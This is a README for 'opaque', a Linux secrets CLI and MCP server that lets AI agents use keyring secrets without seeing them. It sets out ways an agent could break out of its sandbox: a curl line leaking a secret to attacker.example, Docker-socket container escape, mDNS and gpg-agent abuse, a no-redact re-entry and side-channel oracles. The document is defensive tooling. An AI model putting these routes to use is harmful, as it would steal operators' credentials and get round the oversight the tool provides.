# opaque

> **Status:** v1.1.4 — Linux only for now; macOS Keychain backend planned for v1.2.

An **AI-safe secrets CLI** — stores secrets in your OS keyring and lets programs (and AI agents) use them without ever exposing plaintext. Invoked as `opq`.

```
$ opq exec --env OPENAI_API_KEY=openai_key -- curl ... # ok
$ opq get  openai_key | cat                            # blocked
$ opq mcp                                              # MCP server over stdio
```

## Why

When you let an AI agent run shell commands, the agent shouldn't see your API keys. But the **subprocess** the agent spawns still needs them. `opaque` sits between the two:

- The agent calls `opq exec --env VAR=secret_name -- ...` (or the `run_with_secrets` MCP tool).
- `opq` looks up the secret in your keyring and injects it as an environment variable into the child process.
- The child uses the secret normally. Anything the child accidentally writes to stdout/stderr is scanned, and the secret value is replaced with `[REDACTED:VAR]` before reaching the agent.
- The agent never receives the plaintext, only the redacted output.

## Threat model

**In scope:**

- AI reading plaintext from stdout, error messages, or argv.
- AI piping `opq get` to capture values (refused unless stdout is a TTY).
- Subprocesses accidentally echoing secrets (output redaction).
- Shell-history exposure (no secret ever appears in argv).
- Process-list exposure (`ps auxe`) — secrets enter child via `exec` env, not via shell interpolation.
- Memory swap-out of secret pages (mlocked buffers via `memguard`).
- **Intentional network exfiltration by an AI via the MCP `run_with_secrets` tool** — now blocked by default. Every MCP-spawned subprocess runs inside a network namespace (`bwrap --unshare-net`), a private PID namespace (`--unshare-pid`), and a private `/proc` mount (`--proc /proc`), so attacks like `curl -H "X-Leak: $SECRET" attacker.example`, DNS labels carrying the secret, and outbound TCP/UDP all fail; additionally, concurrent `run_with_secrets` calls cannot read each other's `/proc/<pid>/environ` and recover injected secrets. Abstract Unix sockets are isolated by the network namespace. As of v1.1.2 the default SandboxNet profile **also masks `/run/user` and `/tmp` with empty tmpfs mounts** — this closes a confirmed exploit in v1.1.1 where an AI inside the network-blocked sandbox could still talk to the user's keyring over the D-Bus session-bus socket at `/run/user/$UID/bus` and recover other secrets directly. As of v1.1.4 SandboxNet **additionally masks the system D-Bus directory (`/run/dbus`) and every container-runtime socket path the host exposes** (`/run/docker.sock`, `/run/containerd`, `/run/podman`, `/run/crio`, `/run/k3s`, `/run/libvirt`, `/run/lxd`, `/run/incus`, `/run/avahi-daemon`, `/run/buildkit`, plus `/run/snapd.socket`, `/run/snapd-snap.socket`, `/var/lib/{lxd,incus}/unix.socket`). Without these masks, `--ro-bind / /` left them connect()-reachable: an AI could `curl --unix-socket /var/run/docker.sock` to spawn a privileged container with `-v /:/host` (if the operator was in the `docker`/`lxd`/`incus` group), or reach Avahi via the system D-Bus and broadcast the secret as an mDNS TXT record — defeating `--unshare-net` entirely (P0-1 + P1-2, closed in v1.1.4). On systemd distros `/var/run` is a symlink to `/run`, so masking `/run/user` automatically covers `/var/run/user`; do not "fix" this by adding a second `--tmpfs /var/run/user`. The AI must explicitly pass `allow_network=true` to lift the network block, and any such call is recorded as `network_allowed` in the audit log. Setting `isolation="full"` additionally tmpfs-overlays `/home` and `/tmp` and ro-binds only `/usr`, `/etc`, `/lib*`, `/bin`, `/sbin` — blocking exfiltration of other host files even before they reach the network. As of v1.1.4 default SandboxNet **also masks home-directory credential-agent sockets**: `$HOME/.gnupg` is replaced with an empty tmpfs (covering the full gpg-agent socket family — `S.gpg-agent`, `.ssh`, `.extra`, `.browser`, `.scdaemon`) and `$HOME/.docker/run/docker.sock` (rootless Docker) is replaced with `/dev/null`. Without these masks, an AI under default SandboxNet could `gpg --sign` arbitrary payloads as the operator or drive rootless Docker for arbitrary host read — both attacks survive `--unshare-net` because AF_UNIX sockets are filesystem-namespaced, not network-namespaced. Residuals still in scope under default SandboxNet (NOT blocked): custom home-directory Unix sockets outside the masked paths (e.g., `~/.local/share/kwalletd/*.socket`, KDE Wallet's per-user socket; or any AF_UNIX endpoint the operator placed under `$HOME` for a custom service), loopback channels to co-resident services, timing side-channels, kernel-keyring inheritance, and pre-compromise of host binaries under `/usr`. Use `isolation="full"` if any of those reach an attacker-relevant agent.

**Also in scope (post-v1.1.2):**

- **`opq exec --no-redact` re-entry from MCP** (joint review post-v1.1.2 finding, fixed). An AI calling `run_with_secrets({command:"opq", args:["exec","--no-redact",...], allow_network:true})` previously bypassed output redaction: with `allow_network=true` the inner `opq` ran unsandboxed, resolved the secret from the keyring, and with `--no-redact` emitted plaintext through the outer (empty-secret-list) RedactingWriter to the AI. `--no-redact` is now gated identically to `get --plaintext` — TTY + `OPQ_I_AM_HUMAN=1` + retype `no-redact` on the controlling terminal. Gate refusal writes a `denied` audit entry with `Message="no_redact_refused:<reason>"`.
- **Audit-log directory masked under SandboxNet** (joint review post-v1.1.2 finding, fixed). The default SandboxNet profile's `--ro-bind / /` (switched from `--dev-bind` in v1.1.3) left `$XDG_STATE_HOME/opq/audit.log` (default `~/.local/state/opq/audit.log`) readable from the AI subprocess, defeating the `caller="cli"` filter and the `raw_exit`/`elapsed_ms` allowlist in `filterAuditMessageForAI`. SandboxNet now appends `--tmpfs <auditDir>` to the bwrap argv. The path is resolved through `filepath.EvalSymlinks` (TOCTOU defense), `prepareAuditDir` ensures the mount target exists, and `WrapCommand` fails closed if the path cannot be resolved. SandboxFull is unaffected (already `--unshare-all` with explicit ro-binds; the audit-log path is not in the sandbox view).

**Also in scope (v1.1.2):**

- **AI-controlled `LD_PRELOAD` / `PATH` / `BASH_ENV` injection.** Both `opq exec --env` and the MCP `run_with_secrets` tool refuse to inject a value into any variable name on the dynamic-linker / interpreter-startup deny-list. Coverage includes the `LD_*`, `DYLD_*`, `NSS_*`, `GIO_*`, `GCONV_*`, `ERL_*`, `BASH_FUNC_*`, and `GIT_CONFIG_*` prefix families, plus individual names spanning JVM build tooling (MAVEN_OPTS, GRADLE_OPTS, SBT_OPTS), Go module fetch (GOPROXY, GOFLAGS), Rust compiler replacement (RUSTC_WRAPPER, RUSTC), Bun (BUN_OPTIONS), Lua/R/Julia/Haskell/OCaml/Erlang/Tcl/Guile loaders, Nix/Scheme/Clojure/Elixir load paths, editor/pager indirection (EDITOR, VISUAL, PAGER, LESSOPEN, GIT_EDITOR, MANPAGER), askpass programs (SSH_ASKPASS, GIT_ASKPASS), OpenSSL engine loading (OPENSSL_CONF), and git config injection (GIT_EXEC_PATH, GIT_CONFIG_COUNT) — see `env_policy.go` for the full list. This prevents an AI from turning the secret-injection feature into arbitrary code execution by picking a variable name the loader/shell uses to find code.
- **D-Bus / keyring / container-runtime / credential-agent socket access from the MCP sandbox** (J-1 + P0-1 + P1-2 + gap-#3 residual close, confirmed-fix). The default SandboxNet profile uses `--ro-bind / /` (read-only host root) and masks `/run/user`, `/tmp`, the audit directory, the system D-Bus directory (`/run/dbus`), every container-runtime socket path the host exposes (Docker, containerd, podman, CRI-O, k3s, libvirt, LXD, Incus, Avahi, BuildKit, snapd), and — as of v1.1.4 — the canonical home-directory credential-agent socket locations (`$HOME/.gnupg` tmpfs, `$HOME/.docker/run/docker.sock` bind-null) with empty tmpfs / `--bind /dev/null` mounts. Without the runtime-socket masks, `--ro-bind` blocked WRITE but not `connect(2)`: an AI under default SandboxNet could `curl --unix-socket /var/run/docker.sock http://.../containers/create` and (with operator-in-docker-group) get a privileged container with `-v /:/host` for arbitrary host read (P0-1), or reach Avahi over the system D-Bus to publish an mDNS TXT record carrying the secret on local LAN (P1-2). Without the home-dir credential-agent masks, the same connect(2) reachability let an AI sign arbitrary payloads as the operator via `S.gpg-agent` or drive rootless Docker. All vectors are closed by `appendRuntimeSocketMasks` + `appendHomeDirSocketMasks`. Custom home-directory Unix sockets outside the masked paths (e.g., `~/.local/share/kwalletd/*.socket` or any AF_UNIX endpoint the operator placed under `$HOME` for a custom service) remain under default SandboxNet — pick `isolation="full"` for a complete FS view.
- **Multi-process audit-log integrity.** `appendAudit` and `tailAudit` serialize across processes via a dedicated `audit.lock` file (`flock(2)` LOCK_EX / LOCK_SH). Rotation never drops the lock; readers cannot observe torn or duplicated entries even when a writer rotates mid-read.
- **Audit-log error sanitization and AI-visible allowlist.** Backend errors and subprocess start errors are mapped to a fixed taxonomy (`not_found` / `backend_error` / `exec_not_found` / `exec_permission_denied` / `exec_start_failed`) before being written to the audit log. The wrapped error returned to the caller keeps the full detail; only the AI-readable `audit_tail` is sanitized. As of v1.1.2 the AI-visible `msg` field of `mcp_run` entries is additionally passed through a **closed allowlist** — only the tokens `stdout_truncated`, `stderr_truncated`, and `timed_out` survive. Everything else (`raw_exit`, `elapsed_ms`, future audit detail) is stripped, closing the previously-noted exit-code oracle (raw_exit) and the wall-clock timing oracle (elapsed_ms) in a single change.
- **`audit_tail` self-logging (J-5).** Every MCP `audit_tail` invocation appends its own `audit_tail` entry to the log before reading, so an AI scraping the operator's activity is itself visible. The just-written entry is stripped from the response window so the AI's requested `n` is not partially consumed by its own bookkeeping, but the entry persists in the operator-visible log and in subsequent AI calls.
- **Functional sandbox startup probe (J-9).** `opq mcp` runs a no-op `bwrap --unshare-net --unshare-pid -- true` namespace probe at startup. If AppArmor (Ubuntu 23.10+ ships a profile on `bwrap`), seccomp, or a missing kernel `CONFIG_USER_NS` blocks unprivileged namespace creation, the MCP server refuses to start with a clear error — instead of silently failing at first tool-call time.
- **Hard input caps on `run_with_secrets` and `opq exec --env` (J-13, J-14, J-16).** Env-var names are capped at 256 bytes; secret names must match `[A-Za-z0-9_.-]{1,128}` and are validated at every set/get/delete/exec/MCP boundary; `input.Args` is capped at 256 entries per `run_with_secrets` call. Inputs failing any of these gates surface as `invalid_input` or `invalid_secret_name` and are recorded in the audit log.

**Out of scope (v1):**

- Root / kernel attacker.
- Side channels in the legitimate consuming subprocess.
- A malicious subprocess that intentionally exfiltrates the secret via a loopback channel, kernel keyring, or other non-network path the sandbox does not cover.
- Tamper-evident audit log (file mode 0600 only; not cryptographically signed).
- **Encoding-evasion of the redactor — partial coverage.** As of v1.1.4 the redactor expands each registered secret into its raw bytes plus base64 (standard and URL-safe, padded and unpadded) and hex (lower- and upper-case) forms, all mapped to the same `[REDACTED:NAME]` token. A subprocess that pipes the secret through `base64`, `xxd -p`, an OpenSSL hex dump, or a JWT signer no longer leaks plaintext. NOT covered: URL percent-encoding (a no-op for typical alphanumeric API keys), JSON-string escaping (same), arbitrary ciphers (rot13, XOR, base32), and entropy-based heuristics (rejected for false-positive reasons on legitimate hashes/UUIDs/tokens). An AI choosing an encoding outside the registered set can still ship plaintext bytes through stdout/stderr — the redactor remains a guard against accidental echo, not a sandbox.
- **Metadata side-channels in `run_with_secrets` are inherent to the design — reduced, not eliminated.** As of v1.1.4 the only flag still returned to the AI is `timed_out`; `stdout_truncated` and `stderr_truncated` were removed because they were a 1-bit-per-call output-volume oracle. Truncation still happens silently in the per-stream cap, and the operator-facing audit log still records the flags for diagnostics. The residual `len(stdout)` / `len(stderr)` channel is mitigated by bucket-quantization: each stream is padded up to the next power-of-two bucket (1 KiB / 4 KiB / 16 KiB / 64 KiB / 256 KiB) so an adversary measuring response size gets ~2.3 bits per call instead of ~17. Recovering one secret byte under this regime takes ~4 calls of carefully crafted volume rather than one. Wall-clock timing is NOT exposed (`elapsed_ms` is stripped from the AI-visible audit). For deployments fronting an actively adversarial model, the documented mitigation remains the policy-proxy pattern below, which restricts the command set so the AI cannot supply secret-conditional commands.
- **Terminal-escape exfiltration via the rendering client.** If the MCP client renders subprocess stdout in a terminal emulator, an AI-supplied OSC 52 / DCS escape sequence in that output could exfiltrate data to the system clipboard or rewrite the window title. `opq` redacts secret *values* but does not strip escape sequences. `TERM` is on the deny-list (the AI cannot set it), but the subprocess can still emit raw escape bytes. Clients should sanitize tool output before rendering.
- **Loopback channels (`curl http://127.0.0.1:6379`, `redis-cli`, `psql -h 127.0.0.1`).** The MCP network sandbox blocks egress at the namespace boundary, but loopback to co-resident services is NOT blocked. If you run opq on a host with any local service that can forward externally (an HTTP proxy, a database with `COPY TO PROGRAM`, a message queue with a webhook sink), the sandbox is bypassable from inside `run_with_secrets`. Treat loopback as an open egress unless you have audited every listening port.
- **Process-level resource exhaustion by the AI.** Per-call limits exist (60s default timeout / 600s ceiling, 256 KiB per output stream, 32 env vars per call, 200 audit-tail entries) to bound the blast radius of a single call, but a determined AI calling the tool in a tight loop can still consume keyring/CPU/network. Rate-limiting and per-secret allowlists belong in a deployment-side policy proxy (see below).

For high-risk MCP deployments, the recommended pattern is to front `opq mcp` with a small policy-enforcing wrapper MCP server that allowlists `(command, args pattern, env var set)` tuples per secret, denies anything else, and forwards approved calls to `opq`. The opaque CLI itself deliberately ships as a low-trust building block.

## Install

```
go install github.com/alexrios/opaque@latest
```

The installed binary is named `opq`.

Requirements:

- Linux with an unlocked Secret Service session (gnome-keyring, KWallet, or KeePassXC).
- **bubblewrap (`bwrap`) >= 0.5.0** for the MCP subprocess sandbox and `opq exec --sandbox` flag. Install via your package manager (`apt install bubblewrap` on Debian/Ubuntu, `dnf install bubblewrap` on Fedora, `pacman -S bubblewrap` on Arch). `opq mcp` refuses to start without it. Requires a kernel with unprivileged user namespaces enabled (default on most distros). At startup `opq mcp` also runs a no-op `bwrap` namespace probe; if AppArmor (Ubuntu 23.10+ ships a profile on `bwrap`) or seccomp blocks unprivileged namespace creation, the MCP server refuses to start with a clear error rather than silently failing at first tool-call.
- Go 1.25+ to build from source.

## Quick start

```sh
# Store a secret. Value is read from stdin or prompted on a TTY — never on argv.
printf 'sk-...' | opq set openai_api_key

# List names (never values).
opq list

# Use the secret without ever seeing it.
opq exec --env OPENAI_API_KEY=openai_api_key -- curl -H "Authorization: Bearer $OPENAI_API_KEY" https://api.openai.com/v1/models

# What's in the audit log?
opq audit --tail 10
```

## CLI

| Command | Behavior |
| --- | --- |
| `opq set <name>` | Read value from stdin (or hidden TTY prompt). Never accepts values on argv. |
| `opq list` | Print stored secret names. |
| `opq delete <name>` | Remove a secret. |
| `opq get <name> --plaintext` | Print value to stdout. **Refuses** to run unless stdout is a TTY. |
| `opq exec --env VAR=name [...] -- cmd args` | Run `cmd` with named secrets injected as env vars. Subprocess output is redacted by default. Env-var names are capped at 256 bytes and secret names must match `[A-Za-z0-9_.-]{1,128}`. The `--no-redact` flag disables redaction and is **gated identically to `get --plaintext`** — stdout must be a TTY, `OPQ_I_AM_HUMAN=1` must be set inline on the command, and the operator must retype `no-redact` on the controlling terminal. |
| `opq audit [--tail N]` | Show audit-log entries. |
| `opq mcp` | Run as a Model Context Protocol server over stdio. |

## MCP server

Add to your MCP-aware client (Claude Code, etc.):

```jsonc
{
  "mcpServers": {
    "opq": {
      "command": "opq",
      "args": ["mcp"]
    }
  }
}
```

The server exposes three tools:

- `list_secrets()` — returns secret names only.
- `run_with_secrets({ command, args, env: { VAR: secret_name }, timeout_seconds, allow_network, isolation })` — runs the command with secrets injected; returns redacted stdout/stderr, a normalized exit (`success`/`failure` only — the raw status is in the audit log, never returned to the AI), truncation flags, and a timed-out flag. **The subprocess runs inside a network-blocked, PID-isolated sandbox by default** (bubblewrap `--unshare-net --unshare-pid --proc /proc`, with the host filesystem exposed read-only via `--ro-bind / /` and `/run/user`, `/tmp`, `/dev/shm`, the audit directory, `/run/dbus`, and every detected container-runtime socket path masked by empty tmpfs / `--bind /dev/null` mounts); pass `allow_network=true` to opt in to network access (audited as `network_allowed`), or `isolation="full"` for additional tmpfs `/home` and `/tmp` plus minimal ro-binds. Defaults: 60s timeout (capped at 600s), 256 KiB per output stream, **32 env vars per call, 256 args per call, env-var names capped at 256 bytes, and secret names must match `[A-Za-z0-9_.-]{1,128}`**. **Errors returned to the AI are fixed-taxonomy strings only** (`backend_error`, `not_found: <name>`, `exec_not_found`, `exec_permission_denied`, `exec_start_failed`, `sandbox_unavailable`, `wrap_command_failed`, `invalid_input`, `invalid_secret_name`) — never wrapped backend or library text, so a buggy/hostile backend cannot leak secret bytes via tool-result errors.
- `audit_tail({ n })` — recent audit entries, capped at 200 per call. **When called over MCP, results are restricted to `caller="mcp"` entries and the `msg` field of `mcp_run` lines is passed through a closed allowlist**: only the tokens `stdout_truncated`, `stderr_truncated`, and `timed_out` survive. Everything else (`raw_exit`, `elapsed_ms`, future audit detail) is stripped, closing both the per-call 8-bit exit-code oracle and the wall-clock timing oracle. CLI users see the unredacted log via `opq audit`. Each MCP `audit_tail` call also leaves its own `audit_tail` audit entry — the AI's scraping activity is itself visible to operators.

There is **no** `get_secret_value` tool by design. AIs can use secrets, not read them.

**The MCP sandbox blocks network exfiltration, PID-namespace cross-inspection, session-bus keyring access, container-runtime API access, system-D-Bus access, and the canonical home-directory credential-agent sockets — but it is not a complete jail.** With the default SandboxNet profile active, `curl`, `dig`, `nc`, and any other network-capable binary the AI chooses cannot reach external hosts — egress fails at the kernel namespace boundary, not in the binary. Each subprocess also runs in its own PID namespace with a private `/proc`, so concurrent calls cannot read each other's `/proc/<pid>/environ`. The host filesystem is exposed read-only (`--ro-bind / /`), and `/run/user`, `/tmp`, `/dev/shm`, the audit directory, `/run/dbus`, every detected container-runtime socket path (Docker, containerd, podman, CRI-O, k3s, libvirt, LXD, Incus, Avahi, BuildKit, snapd), and the canonical home-dir credential-agent socket locations (`$HOME/.gnupg`, `$HOME/.docker/run/docker.sock`) are masked with empty tmpfs / `--bind /dev/null` mounts. This closes the v1.1.1 D-Bus exploit, the v1.1.2 P0-1 two-call persistent-write exfil chain, the v1.1.3 P0-1/P1-2 container-runtime and Avahi-mDNS exfil chains, and the v1.1.4 home-dir credential-agent (gpg-agent / rootless-Docker) reach-out. The redactor is the second line of defense against the subprocess *accidentally* echoing the secret on stdout/stderr; as of v1.1.4 it expands each registered secret into base64 (std/URL, padded/raw) and hex (lower/upper) forms so common encoding-emit accidents are still caught, but exotic encodings (URL percent, JSON-escape, rot13, base32, custom ciphers) are NOT covered. Residual risks the default sandbox does NOT cover: custom home-directory Unix sockets outside the masked paths (e.g., `~/.local/share/kwalletd/*.socket` or any AF_UNIX endpoint the operator placed under `$HOME` for a custom service), loopback channels to other services on the host, timing side-channels, kernel-keyring inheritance, and pre-compromise of binaries under `/usr`. Pick `isolation="full"` for complete filesystem isolation when any of those reach an attacker-relevant agent. See the [Threat model](#threat-model) section for the recommended policy-proxy deployment pattern for high-risk environments.

## Backends

v1 ships with the Secret Service backend (libsecret over D-Bus) for Linux. The `Backend` interface in `backend.go` is shaped so additional backends drop in without touching anything else:

- macOS Keychain (planned, v1.2).
- Proton Pass (planned, v2).
- `pass` / file-based / KWallet are already reachable via the underlying `99designs/keyring` library; flip them on by editing `AllowedBackends` in `OpenDefaultBackend`.

## Audit log

`${XDG_STATE_HOME:-$HOME/.local/state}/opq/audit.log`, mode 0600. One JSON object per line. A sibling `audit.lock` file (also 0600) serializes appends and tail reads across concurrent `opq` processes; rotation is atomic across processes and never drops the cross-process lock. The active log is capped at 10 MiB and one historical rotation is kept at `audit.log.1`; `opq audit --tail N` spans both files transparently.

Actions: `set`, `get`, `delete`, `list`, `exec_inject`, `mcp_run`, `audit_tail`, `redaction_disabled`, `network_allowed`, `denied`.

Example entries — note that the `msg` field differs between the CLI view (`opq audit`, full operator detail) and the MCP-visible view (`audit_tail` tool, allowlist-filtered):

```json
// CLI view via `opq audit` (full detail)
{"ts":"2026-05-24T15:50:17.189Z","action":"exec_inject","secret_name":"openai_api_key","caller":"cli","pid":50770,"ppid":50701}
{"ts":"2026-05-24T15:50:18.012Z","action":"mcp_run","secret_names":["openai_api_key","stripe_secret_key"],"caller":"mcp","pid":50770,"ppid":50701,"msg":"raw_exit=0 elapsed_ms=143"}
{"ts":"2026-05-24T15:50:19.422Z","action":"audit_tail","caller":"mcp","pid":50770,"ppid":50701,"msg":"n=20"}

// Same entry as seen by the AI via the `audit_tail` MCP tool (J-10 allowlist applied)
{"ts":"2026-05-24T15:50:18.012Z","action":"mcp_run","secret_names":["openai_api_key","stripe_secret_key"],"caller":"mcp","pid":50770,"ppid":50701}
```

`msg` for `mcp_run` is allowlist-filtered for AI consumers (only `stdout_truncated`, `stderr_truncated`, `timed_out` survive); for a clean exit with no truncation the field is empty and omitted from the JSON by `omitempty`. The CLI sees everything; the MCP `audit_tail` tool sees only the filter output. For MCP-driven runs the secret names appear as a structured `secret_names` JSON array (no comma-joined string parsing required). Backend and subprocess-start errors are written to `msg` as fixed-taxonomy tokens (`not_found`, `backend_error`, `exec_not_found`, `exec_permission_denied`, `exec_start_failed`) — never raw library text — so a buggy backend cannot leak secret bytes into the audit stream.

Each MCP `audit_tail` invocation also records its own `audit_tail` event (with `caller="mcp"`) before performing the read, so an AI scraping operator activity is itself visible to operators reviewing the log via `opq audit`.

`caller` is `cli` for direct CLI invocations and `mcp` when the request came through the MCP server, so you can distinguish AI-driven access from human-driven access at a glance.

## Memory hygiene

Secret bytes flow through `memguard.LockedBuffer`s — mlocked pages, guard canaries, zeroed on destroy. The default build is enough for the threat model above.

## Development

```sh
go test ./...
go vet ./...
go build .
```

End-to-end smoke tests require an unlocked Secret Service session on the host.
